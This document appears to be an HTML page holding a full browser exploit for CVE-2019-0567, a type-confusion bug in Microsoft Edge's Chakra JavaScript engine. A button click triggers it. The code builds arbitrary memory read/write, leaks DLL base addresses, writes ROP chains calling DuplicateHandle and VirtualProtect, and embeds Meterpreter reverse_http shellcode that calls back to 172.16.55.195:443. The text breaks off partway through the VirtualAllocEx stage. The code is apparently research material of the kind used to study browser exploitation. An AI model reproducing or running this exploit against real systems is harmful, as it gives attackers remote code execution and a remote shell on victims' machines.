<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Large object used to corrupt metadata of DataView object
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// DataView objects used for read/write primitive
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return `${x.toString(16)}`
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 is the buffer property
    dataview1.setUint32(0x3C, hi, true);        // First set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire array
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0, true);     // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(4, true);     // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);
    dataview1.setUint32(0x3C, hi, true);

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setInt32(0, valLo, true);
    dataview2.setInt32(4, valHi, true);
}

function opt(o, proto, value) {
    o.b = 1;
    let tmp = {__proto__: proto};
    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {        // JIT optimize to remove type guardrails
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    // Print update
    document.write("[+] Calling optimzed function 2000 times to trigger JIT!");
    document.write("<br>");

    // Cause type transition to trigger type confusion vulnerability
    let o = {a: 1, b: 2};

    // Corrupt o.auxSlots with the address of our fake object obj
    opt(o, o, obj);

    // Set o.c, which corrupts our fake object's auxSlots
    // obj.AuxSlots is now set to the first DataView object
    o.c = dataview1;

    // Corrupt the buffer property of dataview1 to point to our dataview2 object
    obj.h = dataview2;

    // Dynamic objects are as follows in memory: | vtable | type | etc.
    // We can read the vtable for the dataview1 object, which is a pointer in Chakra, by retrieving DataView[0];
    // Javascript is limited to 32 bytes for values, so we have to retrieve the full 64-bit address in two steps
    // These steps will get us the address of the vtable
    vtableLo = dataview1.getUint32(0, true);
    vtableHigh = dataview1.getUint32(4, 32);

    // We are also going to store the address of the type as well
    // We will use this to bypass CFG by performing some arbitrary reads to eventually leak a stack address
    typeLo = dataview1.getUint32(8, true);
    typeHigh = dataview1.getUint32(12, true);

    // Store the base address of the image (chakra.dll)
    chakraBase = (vtableLo + vtableHigh * 0x100000000);
    chakraBase -= 0x5d0bf8;

    // Print updates
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: " + "0x" + hex(vtableLo + vtableHigh * 0x100000000));
    document.write("<br>");
    document.write("[+] chakra.dll base: " + "0x" + hex(chakraBase));

    // Let's read from the IAT to get a pointer to kernelbase.dll (this is sufficient for our POC purposes)
    // We have to use the 32-bit "lo" version of Chakra because JavaScript
    kernelbasepointerChakra = chakraBase + 0x5ee2b8;     // Pointer to KERNELBASE!DuplicateHandle

    // "Mask off" everything but the lower 32-bits by setting a 64-bit value ona 32-bit array, so the rest of the 64-bits (e.g. the upper mask) is cut off
    var kernelbasepointerLo = new Uint32Array(0x4);
    kernelbasepointerLo[0] = kernelbasepointerChakra;

    // Perform the arbitrary read
    // This value actually stores KERNELBASE!DuplicateHandle
    kernelbasePointer = read64(kernelbasepointerLo[0], vtableHigh);

    // Also assigning the value for easy reading of code
    duplicateHandle = kernelbasePointer;

    // Store the base address of kernelbase (just for printing purposes)
    // Our "real" kernelbase.dll values are from kernelbaseLo and kernelbaseHigh
    kernelbase = (kernelbasePointer[0] + kernelbasePointer[1] * 0x100000000);
    kernelbase -= 0x18de0;

    // Also go ahead and store the "low" part of kernelbase.dll (will need this later for arbitrary writes) and Chakra
    var kernelbaseloArray = new Uint32Array(0x4);
    kernelbaseloArray[0] = kernelbase;

    var chakrabaseloArray = new Uint32Array(0x4);
    chakrabaseloArray[0] = chakraBase;

    // -----------------------------------------------------------------------------

    // kernel32Lo now contains the "lower mask" of the base address of kernelbase.dll
    kernelbaseLo = kernelbaseloArray[0];

    // kernel32High now contains the "upper mask" of the base address of kernelbase.dll
    kernelbaseHigh = kernelbasePointer[1];

    // chakraHigh now contains the "upper mask" of the base of chakra.dll (remember we leaked the vtable from chakra.dll earlier, so we can just re-use vtableHigh here)
    chakraHigh = vtableHigh;

    // chakraLo now contains the "lower mask" of the base of chakra.dll
    chakraLo = chakrabaseloArray[0];

    // -----------------------------------------------------------------------------

    // Print updates
    //document.write("[+] chakra.dll pointer to kernelbase.dll: " + "0x" + hex(kernelbasePointer[1]) + hex(kernelbasePointer[0]));
    document.write("<br>");
    document.write("[+] kernelbase.dll base: " + "0x" + hex(kernelbase));
    document.write("<br>");

    // With the needed addresses in hand, we now need to redirect execution flow to gain code execution
    // We are dealing with Control Flow Guard as well (CFG)
    // CFG doesn't protect return addresses, so exploitation flow will be as follows:
    // 1. Leak the type (memory address) of our DataView object (just like we did for leaking the associated vtable pointer)
    // 2. There is a member of type called javascriptLibrary. Leak this
    // 3. javascriptLibrary has a member named scriptContext. Leak this.
    // 4. scriptContext has a member named threadContext. Leak this.
    // 5. threadContext has two stack addresses

    // Print update
    document.write("[+] Leaked type from DataView object 2: 0x" + hex(typeLo + typeHigh * 0x100000000));
    document.write("<br>");

    // Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
    javascriptLibrary = read64(typeLo+8, typeHigh);

    // Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])

    // Arbitrary read to get the threadContext pointer (offset 0x3b8)
    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1]);

    // Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
    // Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);

    // Print update
    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
    document.write("<br>");

    // I thought I could use the ACG bypass to directly allocate RWX memory within the JIT process, but it seems like that isn't possible. So to get around this...
    // ... we will just inject a ROP chain into the process and the ROP chain is allowed to mark memory RWX - it just cannot be directly injected it seems via VirtualAllocEx

    // Before we go hunting for a return address to hijack control-flow, let's first write our ROP chain (which will end up in the JIT process) to the .data section of chakra.dll
    // RCX needs to be the eventual code cave we allocated via VirtualAllocEx in the JIT process
    // pop rcx ; ret will take RSP+0x8 and place it into RCX. We want this to be that code cave address. Since this code cave address will end up being the return value of VirtualAllocEx...
    // ... We will currently write a value of 0000000000000000, since our exploit currently doesn't know where this value is, as VirtualAllocEx hasn't been called yet
    // We will use another call to WriteProcessMemory to write this address to ROP_CHAIN+0x8, updating 0x0000000000000000 with the code cave address
    // We will also do this with the "return address" of the below ROP chain. An eventual push rdi ; ret gadget will let us return into the code cave

    // We also will go ahead and write our shellcode directly after the ROP chain. Our ROP chain, after VirtualProtect, will call to our shellcode

    /*
    0:015> dq chakra+0x74e050 L20
    00007fff`3fbde050  00000000`00000000 00000000`00000000
    00007fff`3fbde060  00000000`00000000 00000000`00000000
    00007fff`3fbde070  00000000`00000000 00000000`00000000
    00007fff`3fbde080  00000000`00000000 00000000`00000000
    00007fff`3fbde090  00000000`00000000 00000000`00000000
    00007fff`3fbde0a0  00000000`00000000 00000000`00000000
    00007fff`3fbde0b0  00000000`00000000 00000000`00000000
    00007fff`3fbde0c0  00000000`00000000 00000000`00000000
    00007fff`3fbde0d0  00000000`00000000 00000000`00000000
    00007fff`3fbde0e0  00000000`00000000 00000000`00000000
    00007fff`3fbde0f0  00000000`00000000 00000000`00000000
    00007fff`3fbde100  00000000`00000000 00000000`00000000
    00007fff`3fbde110  00000000`00000000 00000000`00000000
    00007fff`3fbde120  00000000`00000000 00000000`00000000
    00007fff`3fbde130  00000000`00000000 00000000`00000000
    00007fff`3fbde140  00000000`00000000 00000000`00000000
    */

    // VirtualProtect() ROP chain (will be called in the JIT process)
    write64(chakraLo+0x74e050, chakraHigh, chakraLo+0x577fd4, chakraHigh);              // 0x180577fd4: pop rax ; ret
    write64(chakraLo+0x74e050+0x8, chakraHigh, chakraLo+0x72E128, chakraHigh);          // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
    write64(chakraLo+0x74e050+0x10, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
    write64(chakraLo+0x74e050+0x18, chakraHigh, chakraLo+0x74e030, chakraHigh);         // PDWORD lpflOldProtect (any writable address -> Eventually placed in R9)
    write64(chakraLo+0x74e050+0x20, chakraHigh, chakraLo+0xf6270, chakraHigh);          // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    write64(chakraLo+0x74e050+0x28, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    write64(chakraLo+0x74e050+0x30, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    write64(chakraLo+0x74e050+0x38, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    write64(chakraLo+0x74e050+0x40, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    write64(chakraLo+0x74e050+0x48, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    write64(chakraLo+0x74e050+0x50, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
    write64(chakraLo+0x74e050+0x58, chakraHigh, 0x00000000, 0x00000000);                // LPVOID lpAddress (Eventually will be updated to the address we want to mark as RWX, our shellcode)
    write64(chakraLo+0x74e050+0x60, chakraHigh, chakraLo+0x1d2c9, chakraHigh);          // 0x18001d2c9: pop rdx ; ret
    write64(chakraLo+0x74e050+0x68, chakraHigh, 0x00001000, 0x00000000);                // SIZE_T dwSize (0x1000)
    write64(chakraLo+0x74e050+0x70, chakraHigh, chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
    write64(chakraLo+0x74e050+0x78, chakraHigh, 0x00000040, 0x00000000);                // DWORD flNewProtect (PAGE_EXECUTE_READWRITE)
    write64(chakraLo+0x74e050+0x80, chakraHigh, chakraLo+0x577fd4, chakraHigh);         // 0x180577fd4: pop rax ; ret
    write64(chakraLo+0x74e050+0x88, chakraHigh, kernelbaseLo+0x61700, kernelbaseHigh);  // KERNELBASE!VirtualProtect
    write64(chakraLo+0x74e050+0x90, chakraHigh, chakraLo+0x272beb, chakraHigh);         // 0x180272beb: jmp rax (Call KERNELBASE!VirtualProtect)
    write64(chakraLo+0x74e050+0x98, chakraHigh, chakraLo+0x118b9, chakraHigh);          // 0x1800118b9: add rsp, 0x18 ; ret
    write64(chakraLo+0x74e050+0xa0, chakraHigh, 0x41414141, 0x41414141);                // Padding
    write64(chakraLo+0x74e050+0xa8, chakraHigh, 0x41414141, 0x41414141);                // Padding
    write64(chakraLo+0x74e050+0xb0, chakraHigh, 0x41414141, 0x41414141);                // Padding
    write64(chakraLo+0x74e050+0xb8, chakraHigh, chakraLo+0x4c1b65, chakraHigh);         // 0x1804c1b65: pop rdi ; ret
    write64(chakraLo+0x74e050+0xc0, chakraHigh, 0x00000000, 0x00000000);                // Will be updated with the VirtualAllocEx allocation (our shellcode)
    write64(chakraLo+0x74e050+0xc8, chakraHigh, chakraLo+0x1ef039, chakraHigh);         // 0x1801ef039: push rdi ; ret (Return into our shellcode)

    // Counter
    let countMe = 0xd0;

    // Helper function for founting
    function inc()
    {
        countMe+=0x8;
    }

    // Shellcode
    // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.16.55.195 LPORT=443 -f c

    // Begin shellcode
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xe48348fc, 0x00cce8f0);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x51410000, 0x51525041);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x65d23148, 0x60528b48);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x18528b48, 0x528b4856);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xb70f4820, 0x314d4a4a); 
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x728b48c9, 0xc0314850);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x7c613cac, 0x41202c02);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x410dc9c1, 0xede2c101);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x48514152, 0x8b20528b);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x01483c42, 0x788166d0);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x0f020b18, 0x00007285);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x88808b00, 0x48000000);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x6774c085, 0x44d00148);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x5020408b, 0x8bd00149);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x56e31848, 0x48c9314d);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x8b41c9ff, 0x01488834);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xc03148d6, 0xc9c141ac);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xc101410d, 0xf175e038);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x244c034c, 0xd1394508);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4458d875, 0x4924408b);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4166d001, 0x44480c8b);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x491c408b, 0x8b41d001);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x58418804, 0x41d00148);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x5a595e58, 0x59415841);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x83485a41, 0x524120ec);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4158e0ff, 0x8b485a59);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xff4be912, 0x485dffff);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4953db31, 0x6e6977be);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x74656e69, 0x48564100);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xc749e189, 0x26774cc2);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x53d5ff07, 0xe1894853);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x314d5a53, 0xc9314dc0);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xba495353, 0xa779563a);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x00000000, 0x0ee8d5ff);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x31000000, 0x312e3237);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x35352e36, 0x3539312e);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x89485a00, 0xc0c749c1);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x000001bb, 0x53c9314d);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x53036a53, 0x8957ba49);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x0000c69f, 0xd5ff0000);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x0000f7e8, 0x616a2f00);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x6a583852, 0x41446f4f);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x68505149, 0x68633845);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x772d6151, 0x422d464c);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x61654854, 0x4c766566);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x61424e4c, 0x314c5633);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x366b7649, 0x62302d79);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x6b324c61, 0x6d55714e);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x624b6644, 0x4a6a6747);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4a394764, 0x336c6253);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x32387249, 0x38594d56);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x57754566, 0x697a3448);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4b31614a, 0x75795565);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x316a4d78, 0x6a756648);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x6b4b4f43, 0x51535259);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x70415132, 0x7a4b3167);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x56357670, 0x72515238);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x555f5a54, 0x33485149);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x705f6536, 0x6d38346a);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4b424467, 0x6e597054);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x3365496d, 0x596d6f45);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x63343633, 0x31586a76);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x39727038, 0x6a395932);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x72763538, 0x50316a4b);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x766a6742, 0x7a584f58);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x7a733634, 0x6d56426f);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x6e6a4e31, 0x52635577);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x716e5166, 0x4f463054);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x52573634, 0x7a574461);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x67726436, 0x52433266);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x656e6944, 0x6f6e504c);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x0030376f, 0x53c18948);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4d58415a, 0x4853c931);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x280200b8, 0x00000084);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x53535000, 0xebc2c749);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xff3b2e55, 0xc68948d5);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x535f0a6a, 0xf189485a);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x4dc9314d, 0x5353c931);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x2dc2c749, 0xff7b1806);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x75c085d5, 0xc1c7481f);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x00001388, 0xf044ba49);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x0000e035, 0xd5ff0000);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x74cfff48, 0xe8cceb02);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x00000055, 0x406a5953);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xd189495a, 0x4910e2c1);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x1000c0c7, 0xba490000);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xe553a458, 0x00000000);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x9348d5ff, 0x89485353);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xf18948e7, 0x49da8948);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x2000c0c7, 0x89490000);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x12ba49f9, 0x00e28996);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0xff000000, 0xc48348d5);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x74c08520, 0x078b66b2);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x85c30148, 0x58d275c0);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x006a58c3, 0xc2c74959);
    inc();
    write64(chakraLo+0x74e050+countMe, chakraHigh, 0x56a2b5f0, 0x0000d5ff);
    inc();

    // Infinite scan until we find a return address
    // We can reliably traverse the stack 0x6000 bytes
    /*
    0:020> u chakra+0xd4a73
    chakra!Js::JavascriptFunction::CallFunction<1>+0x83:
    00007fff`3a454a73 488b5c2478      mov     rbx,qword ptr [rsp+78h]
    00007fff`3a454a78 4883c440        add     rsp,40h
    00007fff`3a454a7c 5f              pop     rdi
    00007fff`3a454a7d 5e              pop     rsi
    00007fff`3a454a7e 5d              pop     rbp
    00007fff`3a454a7f c3              ret
    */

    // Creating an array to store the return address because read64() returns an array of 2 32-bit values
    var returnAddress = new Uint32Array(0x4);
    returnAddress[0] = chakraLo + 0xd4a73;
    returnAddress[1] = chakraHigh;

    // Store the "lower half" of the stack address in a temporary variable for offset computation
    tempStack = stackleakPointer[0];

    let counter = 0x6000;

    // Infinite scan until we find the return address
    while (counter) {

        // Store the "lower half" of the stack address in a temporary variable for offset computation
        tempStack = stackleakPointer[0] + counter;

        // Read the stack
        readContents = read64(tempStack, stackleakPointer[1]);

        // Did we find an address with 0x7ffX?
        // Is it at least within the chakra known address space?
        if ((readContents[0] == returnAddress[0]) && (readContents[1] == returnAddress[1]))
        {
            document.write("[+] Found our return address on the stack!");
            document.write("<br>");
            document.write("[+] Target stack address: 0x" + hex(stackleakPointer[1]) + hex(tempStack));
            document.write("<br>");

            // Break the loop
            break;
        }
        else
        {
            // Decrement the counter
            // Stack grows downward, so searching towards the "top" of the stack
            counter -= 0x8;
        }
    }

    // Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
    jitHandle = read64(chakraLo+0x74d838, chakraHigh);

    // Using as a counter for stack writes
    // Each gadget goes RSP, RSP+0x8, RSP+0x10, RSP+0x18, etc.
    // Using a counter to easily manager this value
    let offset = 0;

    // Helper function to be called after each stack write to increment offset to be written to
    function next()
    {
        offset+=0x8;
    }

    // Store the stack location as a more easily-readable variable
    lowerStack = tempStack;
    upperStack = stackleakPointer[1];

    // alert() for debugging
    //alert();

    // Begin ROP chain
    // Since __fastcall requires paramters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
    // This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
    // Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

    // DuplicateHandle() ROP chain
    // Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
    // ACG is disabled in the renderer process
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

    // Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

    // HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

    // HANDLE hSourceHandle (RDX)
    // (HANDLE)-1 value of current process
    write64(lowerStack+offset, upperStack, chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(lowerStack+offset, upperStack, 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
    next();

    // HANDLE hTargetProcessHandle (R8)
    // (HANDLE)-1 value of current process
    write64(lowerStack+offset, upperStack, chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
    next();

    // LPHANDLE lpTargetHandle (R9)
    // This needs to be a writable address where the full JIT handle will be stored
    // Using .data section of chakra.dll in a part where there is no data
    /*
    0:053> dqs chakra+0x72E000+0x20010
    00007ffc`052ae010  00000000`00000000
    00007ffc`052ae018  00000000`00000000
    */
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // HANDLE hSourceProcessHandle (RCX)
    // Handle to the JIT process from the content process
    write64(lowerStack+offset, upperStack, chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(lowerStack+offset, upperStack, jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
    next();

    // Call KERNELBASE!DuplicateHandle
    write64(lowerStack+offset, upperStack, chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(lowerStack+offset, upperStack, kernelbasePointer[0], kernelbasePointer[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
    next();
    write64(lowerStack+offset, upperStack, chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
    next(); 
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
    next();
    write64(lowerStack+offset, upperStack, 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
    next();
    write64(lowerStack+offset, upperStack, 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
    next();

    // VirtuaAllocEx() ROP chain
    // Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

    // DWORD flAllocationType (R9)
    // MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
    /*
    0:031> ? 0x00002000 | 0x00001000 
    Evaluate expression: 12288 = 00000000`00003000
    */
